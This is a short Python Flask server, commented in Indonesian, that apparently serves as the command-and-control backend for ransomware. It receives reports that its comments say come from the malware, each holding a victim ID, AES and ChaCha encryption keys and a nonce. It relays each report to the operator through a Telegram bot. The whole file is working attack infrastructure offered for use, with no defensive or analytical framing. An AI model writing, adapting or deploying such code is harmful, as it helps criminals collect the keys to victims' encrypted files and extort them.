import os
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

# AMBIL RAHASIA DARI ENVIRONMENT VARIABLE RAILWAY
# JANGAN TULIS TOKEN DI SINI!
BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")

@app.route('/', methods=['GET'])
def index():
    return "System Online", 200

@app.route('/report', methods=['POST'])
def report():
    data = request.json
    
    # 1. Ambil data mentah dari Malware
    victim_id = data.get("id", "Unknown")
    aes_key = data.get("aes", "No Key")
    chacha_key = data.get("chacha", "No Key")
    nonce = data.get("nonce", "No Nonce")

    # 2. Format Pesan Cantik untuk Telegram
    message = (
        f"🔔 **INCOMING CONNECTION**\n\n"
        f"🆔 ID: `{victim_id}`\n"
        f"🔑 AES: `{aes_key}`\n"
        f"🔑 ChaCha: `{chacha_key}`\n"
        f"🎲 Nonce: `{nonce}`"
    )

    # 3. Kirim ke Telegram API
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }

    resp = requests.post(url, json=payload)

    if resp.status_code == 200:
        return jsonify({"status": "success"}), 200
    else:
        return jsonify({"status": "failed"}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))
